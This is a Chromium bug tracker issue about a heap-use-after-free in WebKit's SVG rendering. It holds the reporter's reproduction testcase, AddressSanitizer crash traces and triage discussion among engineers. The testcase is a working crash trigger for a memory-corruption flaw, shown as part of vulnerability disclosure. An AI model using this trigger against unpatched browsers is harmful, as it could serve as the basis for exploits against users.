# Heap-use-after-free in WebCore::RenderObject::container

| Field | Value |
|-------|-------|
| **Issue ID** | [40077206](https://issues.chromium.org/issues/40077206) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2013-03-17 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

race condition / user-after-free with svg

**VERSION**  

Chrome Version: dev  

Operating System: linux + osx

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
document.body.appendChild(el0)
el1=document.createElementNS('http://www.w3.org/2000/svg', 'rect')
el0.appendChild(el1)
```
    el2=document.createElementNS('http://www.w3.org/2000/svg', 'svg')  
    document.body.appendChild(el2)  
    el3=document.createElementNS('http://www.w3.org/2000/svg', 'clipPath')  
    el3.setAttribute('id','el3')  
    el2.appendChild(el3)  

    setTimeout(function() {  
      el2.setAttribute('clip-path', 'url(#el3)')  

      el4=document.createElementNS('http://www.w3.org/2000/svg', 'animate')  
      el1.appendChild(el4)  
      el4.setAttribute('attributeName', 'x')  
      el4.setAttribute('dur', '100ms')  
      setTimeout("location.reload()", 100)  
    }, 10)  
  }  
</script>  

```
 </head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==24830== ERROR: AddressSanitizer: heap-use-after-free on address 0x6046000d5618 at pc 0x55555b53b699 bp 0x7fffffff7d20 sp 0x7fffffff7d18  

READ of size 8 at 0x6046000d5618 thread T0 (asan-release)  

#0 0x55555b53b698 in parent /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WebCore/rendering/RenderObject.h:166  

#1 0x55555b539f7f in markContainingBlocksForLayout

0x6046000d5618 is located 24 bytes inside of 352-byte region [0x6046000d5600,0x6046000d5760)  

freed by thread T0 (asan-release) here:  

#0 0x5555565a1632 in free ??:0  

#1 0x555558ec5771 in detach /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WebCore/dom/Node.cpp:1114  

#2 0x555558e80b4f in detach /b/build/slave/ASAN\_Release/build/third\_party/WebKit/Source/WebCore/dom/Element.cpp:1310

## Attachments

- [gl6-linux.txt](attachments/gl6-linux.txt) (text/plain; charset=us-ascii, 15.2 KB)
- [gl6.txt](attachments/gl6.txt) (text/plain; charset=us-ascii, 2.6 KB)
- [gl6.html](attachments/gl6.html) (text/html; charset=us-ascii, 944 B)

## Timeline

### pa...@chromium.org (2013-03-19)

In process: https://cluster-fuzz.appspot.com/testcase?key=172339628

### pa...@google.com (2013-03-20)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=172339628

Uploader: parisa@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x602e0001cdd8
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  

Minimized Testcase (0.92 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97U_aL9kBRXyfN0jhyHnXqSDs_RMqcT-GSayo7vvoncrG04_OJYrMic9Q0M7-fEPX9YDy5z2bcGWuzWkwL2L63hSwvqSTKQ0zwjjVpkJTAdqBvE09Y_vZhG5TUG9C_f640xZzvA3l1zbTYt6OreDzF68Xct69qpzjI6oQ4SXhEYK2eJd8s
<html>
  <head>
    <script>
      onload = function() {
        el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
        document.body.appendChild(el0)
        el1=document.createElementNS('http://www.w3.org/2000/svg', 'rect')
        el0.appendChild(el1)

        el2=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
        document.body.appendChild(el2)
        el3=document.createElementNS('http://www.w3.org/2000/svg', 'clipPath')
        el3.setAttribute('id','el3')
        el2.appendChild(el3)

        setTimeout(function() {
          el2.setAttribute('clip-path', 'url(#el3)')

          el4=document.createElementNS('http://www.w3.org/2000/svg', 'animate')
          el1.appendChild(el4)
          el4.setAttribute('attributeName', 'x')
          el4.setAttribute('dur', '100ms')
          setTimeout("location.reload()", 100)
        }, 10)
      }
    </script>
  </head>
  <body>
  </body>
</html>

### pa...@chromium.org (2013-03-20)

[Empty comment from Monorail migration]

### pd...@chromium.org (2013-03-20)

Layout during document teardown :/

Do we have a regression range for this?

### in...@chromium.org (2013-03-20)

regression range says 0:106670 which we call "the start of time" (like 2 years back when we started archiving builds). So, this bug has existed forever.

### sc...@gmail.com (2013-03-20)

Interesting. Does this mean that it affects stable? @miaubiz states "version: dev"

### pa...@chromium.org (2013-03-20)

Clusterfuzz says it affects Stable (25.0.1364.172) and Beta (26.0.1410.33).

### sc...@chromium.org (2013-03-20)

I'll take it.

### sc...@gmail.com (2013-03-20)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-03-21)

I'm inclined to call this Security_Severity-High, unless there are objections?

### pa...@chromium.org (2013-03-21)

Assuming we'd want to merge a fix.

### cl...@chromium.org (2013-03-21)

ClusterFuzz has detected this issue as fixed in range 188725:188791.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=172339628

Uploader: parisa@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x602e0001cdd8
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=188725:188791

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97U_aL9kBRXyfN0jhyHnXqSDs_RMqcT-GSayo7vvoncrG04_OJYrMic9Q0M7-fEPX9YDy5z2bcGWuzWkwL2L63hSwvqSTKQ0zwjjVpkJTAdqBvE09Y_vZhG5TUG9C_f640xZzvA3l1zbTYt6OreDzF68Xct69qpzjI6oQ4SXhEYK2eJd8s

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@chromium.org (2013-03-21)

ClusterFuzz has it wrong. Still crashing in r189685.

### in...@chromium.org (2013-03-22)

i download r188791 locally and it does not crash there. weird. schenney@, are you testing in chrome or vanilla webkit ?

### sc...@chromium.org (2013-03-22)

I got the Asan hit with ToT WebKit and ToT chromium, with Asan enabled. It definitely didn't show any symptoms when Asan was not enabled (I actually thought it was not crashing, until I realised I hadn't enabled Asan).

I haven't figured out if it requires expose-gc or not, and it didn't crash as-is in DRT, but that's probably due to the test exiting too soon. More info today, maybe, although I have some higher priority things to get done.

### cl...@chromium.org (2013-03-24)

ClusterFuzz has detected this issue as fixed in range 189819:189983.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=172339628

Uploader: parisa@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x602e0001cdd8
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=189819:189983

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97U_aL9kBRXyfN0jhyHnXqSDs_RMqcT-GSayo7vvoncrG04_OJYrMic9Q0M7-fEPX9YDy5z2bcGWuzWkwL2L63hSwvqSTKQ0zwjjVpkJTAdqBvE09Y_vZhG5TUG9C_f640xZzvA3l1zbTYt6OreDzF68Xct69qpzjI6oQ4SXhEYK2eJd8s

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### me...@google.com (2013-03-26)

Assigning severity label per https://crbug.com/chromium/209604#c10.

### sc...@chromium.org (2013-03-26)

Now I can't reproduce it, so I'm marking WontFix.

### sc...@gmail.com (2013-03-26)

@miaubiz: does it still repro from you? I'm away from my ASAN-ified machine.

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### mi...@gmail.com (2013-04-14)

@scarybeasts: yes it is w/ rev 194114.  I can also repro with current stable. 

### sc...@gmail.com (2013-04-14)

Thanks! Re-opening.

### in...@chromium.org (2013-04-14)

Yes it reproduces again now. https://cluster-fuzz.appspot.com/testcase?key=172339628, i clicked redo.

### cl...@chromium.org (2013-04-17)

ClusterFuzz has detected this issue as fixed in range 188725:188791.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=172339628

Uploader: parisa@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x602e00017978
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=188725:188791

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94digSBkfrp0lPkUjFLinb4rpW-tkFPENiPCz7eEB9199W2HzxFFdPMP1Xum2W4iANaFFSFPJ_6Vvacvvp5cS1Li7pY7yOSkiR6LNDIyv06Zs3pE8GZFtTjmutqu9cB4jfOKYoc6iclWDT8UAof3WF-MyZyts287hjI52ILlXXMbIcXRDk

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@chromium.org (2013-04-19)

I have to agree with ClusterFuzz. This is fixed, or at least doesn't repro.

### in...@chromium.org (2013-04-19)

Here is the thing about this one. THis is racy testcase, CF gets confused. When i clicked redo, it still reproduced. The thing is locally i can't get it to reproduce at all, even after half an hour. Miaubiz, can you try to create a less racy or reproducible repro. Can you double check if you can still reproduce on trunk ?

onload = function() {
......
          setTimeout("location.reload()", 100)
        }, 10)

### cl...@chromium.org (2013-04-20)

[Comment Deleted]

### mi...@gmail.com (2013-04-21)

@inferno: I'll look into it. 

### in...@chromium.org (2013-04-21)

Ignore the last ClusterFuzz which says fixed in range "195296:195394". Looks like a bad build sneeked in [clang roll] and ASAN stopped working. Things look fine on trunk, so i clicked redo on ClusterFuzz reports.

### cl...@chromium.org (2013-04-21)

[Comment Deleted]

### cl...@chromium.org (2013-04-30)

ClusterFuzz has detected this issue as fixed in range 188725:188791.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=172339628

Uploader: parisa@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x602e00017978
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=188725:188791

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94digSBkfrp0lPkUjFLinb4rpW-tkFPENiPCz7eEB9199W2HzxFFdPMP1Xum2W4iANaFFSFPJ_6Vvacvvp5cS1Li7pY7yOSkiR6LNDIyv06Zs3pE8GZFtTjmutqu9cB4jfOKYoc6iclWDT8UAof3WF-MyZyts287hjI52ILlXXMbIcXRDk

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2013-05-02)

Please do read Mark's email titled "Calling a Code 28 for Security Bugs" on chrome-team mailing list.

### in...@chromium.org (2013-05-02)

Miaubiz@, did you get a chance to create a more reliable repro. We have a hard time reproducing this on trunk.

### mi...@gmail.com (2013-05-03)

sorry not yet, was away.

### in...@chromium.org (2013-05-03)

Reproduces on trunk, took like 10 min on my asan build. This is a better stack.

=================================================================
==27438==ERROR: AddressSanitizer: heap-use-after-free on address 0x6130006cd0d8 at pc 0x7f8e6f5846c2 bp 0x7fffc82c1d70 sp 0x7fffc82c1d68
READ of size 8 at 0x6130006cd0d8 thread T0 (chrome)
    #0 0x7f8e6f5846c1 in WebCore::RenderObject::parent() const out/Release/../../third_party/WebKit/Source/core/rendering/RenderObject.h:158
    #1 0x7f8e722b60d6 in WebCore::RenderObject::container(WebCore::RenderLayerModelObject const*, bool*) const out/Release/../../third_party/WebKit/Source/core/rendering/RenderObject.cpp:2312
    #2 0x7f8e722b5e13 in WebCore::RenderObject::markContainingBlocksForLayout(bool, WebCore::RenderObject*) out/Release/../../third_party/WebKit/Source/core/rendering/RenderObject.cpp:689
    #3 0x7f8e73b44ed8 in WebCore::FrameView::scheduleRelayout() out/Release/../../third_party/WebKit/Source/core/page/FrameView.cpp:1932
    #4 0x7f8e6f5448a7 in WebCore::RenderObject::setNeedsLayout(bool, WebCore::MarkingBehavior) out/Release/../../third_party/WebKit/Source/core/rendering/RenderObject.h:1182
    #5 0x7f8e70e94987 in WebCore::RenderSVGResource::markForLayoutAndParentResourceInvalidation(WebCore::RenderObject*, bool) out/Release/../../third_party/WebKit/Source/core/rendering/svg/RenderSVGResource.cpp:199
    #6 0x7f8e70e9c13f in WebCore::RenderSVGResourceContainer::markAllClientsForInvalidation(WebCore::RenderSVGResourceContainer::InvalidationMode) out/Release/../../third_party/WebKit/Source/core/rendering/svg/RenderSVGResourceContainer.cpp:114
    #7 0x7f8e70e962f3 in WebCore::RenderSVGResourceClipper::removeAllClientsFromCache(bool) out/Release/../../third_party/WebKit/Source/core/rendering/svg/RenderSVGResourceClipper.cpp:79
    #8 0x7f8e70ecb650 in WebCore::SVGResources::resourceDestroyed(WebCore::RenderSVGResourceContainer*) out/Release/../../third_party/WebKit/Source/core/rendering/svg/SVGResources.cpp:390
    #9 0x7f8e70ecf135 in WebCore::SVGResourcesCache::resourceDestroyed(WebCore::RenderSVGResourceContainer*) out/Release/../../third_party/WebKit/Source/core/rendering/svg/SVGResourcesCache.cpp:205
    #10 0x7f8e70e9ba6d in WebCore::RenderSVGResourceContainer::willBeDestroyed() out/Release/../../third_party/WebKit/Source/core/rendering/svg/RenderSVGResourceContainer.cpp:67
    #11 0x7f8e722c5b65 in WebCore::RenderObject::destroy() out/Release/../../third_party/WebKit/Source/core/rendering/RenderObject.cpp:2558
    #12 0x7f8e731f98eb in WebCore::Node::detach() out/Release/../../third_party/WebKit/Source/core/dom/Node.cpp:1140
    #13 0x7f8e731b0a80 in WebCore::Element::detach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1314
    #14 0x7f8e731170ea in WebCore::ContainerNode::detachChildren() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.h:215
    #15 0x7f8e7311707d in WebCore::ContainerNode::detach() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:774
    #16 0x7f8e731b0a80 in WebCore::Element::detach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1314
    #17 0x7f8e731170ea in WebCore::ContainerNode::detachChildren() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.h:215
    #18 0x7f8e7311707d in WebCore::ContainerNode::detach() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:774
    #19 0x7f8e731b0a80 in WebCore::Element::detach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1314
    #20 0x7f8e731170ea in WebCore::ContainerNode::detachChildren() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.h:215
    #21 0x7f8e7311707d in WebCore::ContainerNode::detach() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:774
    #22 0x7f8e731b0a80 in WebCore::Element::detach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1314
    #23 0x7f8e731170ea in WebCore::ContainerNode::detachChildren() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.h:215
    #24 0x7f8e7311707d in WebCore::ContainerNode::detach() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:774
    #25 0x7f8e73141d8c in WebCore::Document::detach() out/Release/../../third_party/WebKit/Source/core/dom/Document.cpp:1920
    #26 0x7f8e73b2df9e in WebCore::Frame::setView(WTF::PassRefPtr<WebCore::FrameView>) out/Release/../../third_party/WebKit/Source/core/page/Frame.cpp:249
    #27 0x7f8e73b3078c in WebCore::Frame::createView(WebCore::IntSize const&, WebCore::Color const&, bool, WebCore::IntSize const&, bool, WebCore::ScrollbarMode, bool, WebCore::ScrollbarMode, bool) out/Release/../../third_party/WebKit/Source/core/page/Frame.cpp:554
    #28 0x7f8e6ece45b2 in WebKit::WebFrameImpl::createFrameView() out/Release/../../third_party/WebKit/Source/WebKit/chromium/src/WebFrameImpl.cpp:2231
    #29 0x7f8e73a3a074 in WebCore::FrameLoader::transitionToCommitted() out/Release/../../third_party/WebKit/Source/core/loader/FrameLoader.cpp:1696
    #30 0x7f8e73a39a5c in WebCore::FrameLoader::commitProvisionalLoad() out/Release/../../third_party/WebKit/Source/core/loader/FrameLoader.cpp:1590
    #31 0x7f8e73a128e2 in WebCore::DocumentLoader::commitLoad(char const*, int) out/Release/../../third_party/WebKit/Source/core/loader/DocumentLoader.cpp:646
    #32 0x7f8e73a8b2ad in WebCore::CachedRawResource::appendData(char const*, int) out/Release/../../third_party/WebKit/Source/core/loader/cache/CachedRawResource.cpp:52
    #33 0x7f8e73a61a71 in WebCore::ResourceLoader::didReceiveData(WebCore::ResourceHandle*, char const*, int, int) out/Release/../../third_party/WebKit/Source/core/loader/ResourceLoader.cpp:443
    #34 0x7f8e71c8e9bc in content::ResourceDispatcher::OnReceivedData(IPC::Message const&, int, int, int, int) out/Release/../../content/common/resource_dispatcher.cc:414
    #35 0x7f8e71c90f30 in bool ResourceMsg_DataReceived::Dispatch<content::ResourceDispatcher, content::ResourceDispatcher, int, int, int, int>(IPC::Message const*, content::ResourceDispatcher*, content::ResourceDispatcher*, void (content::ResourceDispatcher::*)(IPC::Message const&, int, int, int, int)) out/Release/../../content/common/resource_messages.h:243
    #36 0x7f8e71c8d69e in content::ResourceDispatcher::DispatchMessage(IPC::Message const&) out/Release/../../content/common/resource_dispatcher.cc:611
    #37 0x7f8e71c8c951 in content::ResourceDispatcher::OnMessageReceived(IPC::Message const&) out/Release/../../content/common/resource_dispatcher.cc:305
    #38 0x7f8e71b2845c in content::ChildThread::OnMessageReceived(IPC::Message const&) out/Release/../../content/common/child_thread.cc:235
    #39 0x7f8e6e741e40 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) out/Release/../../ipc/ipc_channel_proxy.cc:261
    #40 0x7f8e6e749d74 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::*)(IPC::Message const&)>, void (IPC::ChannelProxy::Context* const&, IPC::Message const&)>::MakeItSo(base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::*)(IPC::Message const&)>, IPC::ChannelProxy::Context* const&, IPC::Message const&) out/Release/../../base/bind_internal.h:899
    #41 0x7f8e6f436364 in base::MessageLoop::RunTask(base::PendingTask const&) out/Release/../../base/message_loop.cc:484
    #42 0x7f8e6f436b6b in base::MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) out/Release/../../base/message_loop.cc:496
    #43 0x7f8e6f436db1 in base::MessageLoop::DoWork() out/Release/../../base/message_loop.cc:688
    #44 0x7f8e6f4432f7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) out/Release/../../base/message_pump_default.cc:29
    #45 0x7f8e6f435a29 in base::MessageLoop::RunInternal() out/Release/../../base/message_loop.cc:441
    #46 0x7f8e6f4722c9 in base::RunLoop::Run() out/Release/../../base/run_loop.cc:45
    #47 0x7f8e6f43455d in base::MessageLoop::Run() out/Release/../../base/message_loop.cc:321
    #48 0x7f8e7486f98d in content::RendererMain(content::MainFunctionParams const&) out/Release/../../content/renderer/renderer_main.cc:234
    #49 0x7f8e7245ef33 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate*) out/Release/../../content/app/content_main_runner.cc:383
    #50 0x7f8e7245f923 in content::RunNamedProcessTypeMain(std::string const&, content::MainFunctionParams const&, content::ContentMainDelegate*) out/Release/../../content/app/content_main_runner.cc:439
    #51 0x7f8e72460733 in content::ContentMainRunnerImpl::Run() out/Release/../../content/app/content_main_runner.cc:738
    #52 0x7f8e7245e647 in content::ContentMain(int, char const**, content::ContentMainDelegate*) out/Release/../../content/app/content_main.cc:35
    #53 0x7f8e6d54bfc6 in ChromeMain out/Release/../../chrome/app/chrome_main.cc:32
    #54 0x7f8e6d54bf0a in main out/Release/../../chrome/app/chrome_exe_main_gtk.cc:39
    #55 0x7f8e6399d76c in
    #56 0x7f8e6d54be2c in
0x6130006cd0d8 is located 24 bytes inside of 352-byte region [0x6130006cd0c0,0x6130006cd220)
freed by thread T0 (chrome) here:
    #0 0x7f8e6d53e152 in __interceptor_free
    #1 0x7f8e731f98eb in WebCore::Node::detach() out/Release/../../third_party/WebKit/Source/core/dom/Node.cpp:1140
    #2 0x7f8e731b0a80 in WebCore::Element::detach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1314
    #3 0x7f8e731170ea in WebCore::ContainerNode::detachChildren() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.h:215
    #4 0x7f8e7311707d in WebCore::ContainerNode::detach() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:774
    #5 0x7f8e731b0a80 in WebCore::Element::detach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1314
    #6 0x7f8e731170ea in WebCore::ContainerNode::detachChildren() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.h:215
    #7 0x7f8e7311707d in WebCore::ContainerNode::detach() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:774
    #8 0x7f8e731b0a80 in WebCore::Element::detach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1314
    #9 0x7f8e731170ea in WebCore::ContainerNode::detachChildren() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.h:215
    #10 0x7f8e7311707d in WebCore::ContainerNode::detach() out/Release/../../third_party/WebKit/Source/core/dom/ContainerNode.cpp:774
    #11 0x7f8e73141d8c in WebCore::Document::detach() out/Release/../../third_party/WebKit/Source/core/dom/Document.cpp:1920
    #12 0x7f8e73b2df9e in WebCore::Frame::setView(WTF::PassRefPtr<WebCore::FrameView>) out/Release/../../third_party/WebKit/Source/core/page/Frame.cpp:249
    #13 0x7f8e73b3078c in WebCore::Frame::createView(WebCore::IntSize const&, WebCore::Color const&, bool, WebCore::IntSize const&, bool, WebCore::ScrollbarMode, bool, WebCore::ScrollbarMode, bool) out/Release/../../third_party/WebKit/Source/core/page/Frame.cpp:554
    #14 0x7f8e6ece45b2 in WebKit::WebFrameImpl::createFrameView() out/Release/../../third_party/WebKit/Source/WebKit/chromium/src/WebFrameImpl.cpp:2231
    #15 0x7f8e73a3a074 in WebCore::FrameLoader::transitionToCommitted() out/Release/../../third_party/WebKit/Source/core/loader/FrameLoader.cpp:1696
    #16 0x7f8e73a39a5c in WebCore::FrameLoader::commitProvisionalLoad() out/Release/../../third_party/WebKit/Source/core/loader/FrameLoader.cpp:1590
    #17 0x7f8e73a128e2 in WebCore::DocumentLoader::commitLoad(char const*, int) out/Release/../../third_party/WebKit/Source/core/loader/DocumentLoader.cpp:646
    #18 0x7f8e73a8b2ad in WebCore::CachedRawResource::appendData(char const*, int) out/Release/../../third_party/WebKit/Source/core/loader/cache/CachedRawResource.cpp:52
    #19 0x7f8e73a61a71 in WebCore::ResourceLoader::didReceiveData(WebCore::ResourceHandle*, char const*, int, int) out/Release/../../third_party/WebKit/Source/core/loader/ResourceLoader.cpp:443
    #20 0x7f8e71c8e9bc in content::ResourceDispatcher::OnReceivedData(IPC::Message const&, int, int, int, int) out/Release/../../content/common/resource_dispatcher.cc:414
    #21 0x7f8e71c90f30 in bool ResourceMsg_DataReceived::Dispatch<content::ResourceDispatcher, content::ResourceDispatcher, int, int, int, int>(IPC::Message const*, content::ResourceDispatcher*, content::ResourceDispatcher*, void (content::ResourceDispatcher::*)(IPC::Message const&, int, int, int, int)) out/Release/../../content/common/resource_messages.h:243
    #22 0x7f8e71c8d69e in content::ResourceDispatcher::DispatchMessage(IPC::Message const&) out/Release/../../content/common/resource_dispatcher.cc:611
    #23 0x7f8e71c8c951 in content::ResourceDispatcher::OnMessageReceived(IPC::Message const&) out/Release/../../content/common/resource_dispatcher.cc:305
    #24 0x7f8e71b2845c in content::ChildThread::OnMessageReceived(IPC::Message const&) out/Release/../../content/common/child_thread.cc:235
    #25 0x7f8e6e741e40 in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) out/Release/../../ipc/ipc_channel_proxy.cc:261
    #26 0x7f8e6e749d74 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::*)(IPC::Message const&)>, void (IPC::ChannelProxy::Context* const&, IPC::Message const&)>::MakeItSo(base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::*)(IPC::Message const&)>, IPC::ChannelProxy::Context* const&, IPC::Message const&) out/Release/../../base/bind_internal.h:899
    #27 0x7f8e6f436364 in base::MessageLoop::RunTask(base::PendingTask const&) out/Release/../../base/message_loop.cc:484
    #28 0x7f8e6f436b6b in base::MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) out/Release/../../base/message_loop.cc:496
    #29 0x7f8e6f436db1 in base::MessageLoop::DoWork() out/Release/../../base/message_loop.cc:688
previously allocated by thread T0 (chrome) here:
    #0 0x7f8e6d53e232 in __interceptor_malloc
    #1 0x7f8e70e49aa2 in WebCore::SVGSVGElement::createRenderer(WebCore::RenderArena*, WebCore::RenderStyle*) out/Release/../../third_party/WebKit/Source/core/svg/SVGSVGElement.cpp:489
    #2 0x7f8e73218ff8 in WebCore::NodeRenderingContext::createRendererForElementIfNeeded() out/Release/../../third_party/WebKit/Source/core/dom/NodeRenderingContext.cpp:251
    #3 0x7f8e731b0143 in WebCore::Element::createRendererIfNeeded() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1253
    #4 0x7f8e731b025a in WebCore::Element::attach() out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1262
    #5 0x7f8e731b169b in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1394
    #6 0x7f8e731b1a08 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1460
    #7 0x7f8e731b1a08 in WebCore::Element::recalcStyle(WebCore::Node::StyleChange) out/Release/../../third_party/WebKit/Source/core/dom/Element.cpp:1460
    #8 0x7f8e7313f994 in WebCore::Document::recalcStyle(WebCore::Node::StyleChange) out/Release/../../third_party/WebKit/Source/core/dom/Document.cpp:1668
    #9 0x7f8e7313b470 in WebCore::Document::updateStyleIfNeeded() out/Release/../../third_party/WebKit/Source/core/dom/Document.cpp:1709
    #10 0x7f8e73140176 in WebCore::Document::implicitClose() out/Release/../../third_party/WebKit/Source/core/dom/Document.cpp:2271
    #11 0x7f8e73a31ee4 in WebCore::FrameLoader::checkCompleted() out/Release/../../third_party/WebKit/Source/core/loader/FrameLoader.cpp:744
    #12 0x7f8e73a30094 in WebCore::FrameLoader::finishedParsing() out/Release/../../third_party/WebKit/Source/core/loader/FrameLoader.cpp:677
    #13 0x7f8e7314f7ff in WebCore::Document::finishedParsing() out/Release/../../third_party/WebKit/Source/core/dom/Document.cpp:4119
    #14 0x7f8e6f6292f4 in WebCore::HTMLDocumentParser::prepareToStopParsing() out/Release/../../third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:200
    #15 0x7f8e6f62bcbf in WebCore::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>) out/Release/../../third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:436
    #16 0x7f8e6f629e35 in WebCore::HTMLDocumentParser::pumpPendingSpeculations() out/Release/../../third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:466
    #17 0x7f8e6f62a86e in WebCore::HTMLDocumentParser::didReceiveParsedChunkFromBackgroundParser(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>) out/Release/../../third_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:316
    #18 0x7f8e6f6ba38a in WTF::FunctionWrapper<void (WebCore::HTMLDocumentParser::*)(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>::operator()(WTF::WeakPtr<WebCore::HTMLDocumentParser> const&, WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>) out/Release/../../third_party/WebKit/Source/wtf/Functional.h:254
    #19 0x7f8e6f6ba255 in WTF::BoundFunctionImpl<WTF::FunctionWrapper<void (WebCore::HTMLDocumentParser::*)(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>, void (WTF::WeakPtr<WebCore::HTMLDocumentParser>, WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>::operator()() out/Release/../../third_party/WebKit/Source/wtf/Functional.h:522
    #20 0x7f8e71e3dd2d in WTF::callFunctionObject(void*) out/Release/../../third_party/WebKit/Source/wtf/chromium/MainThreadChromium.cpp:61
    #21 0x7f8e6f3dbf92 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (*)(void*)>, void (void* const&)>::MakeItSo(base::internal::RunnableAdapter<void (*)(void*)>, void* const&) out/Release/../../base/bind_internal.h:871
    #22 0x7f8e6f436364 in base::MessageLoop::RunTask(base::PendingTask const&) out/Release/../../base/message_loop.cc:484
    #23 0x7f8e6f436b6b in base::MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) out/Release/../../base/message_loop.cc:496
    #24 0x7f8e6f436db1 in base::MessageLoop::DoWork() out/Release/../../base/message_loop.cc:688
    #25 0x7f8e6f4432f7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) out/Release/../../base/message_pump_default.cc:29
    #26 0x7f8e6f435a29 in base::MessageLoop::RunInternal() out/Release/../../base/message_loop.cc:441
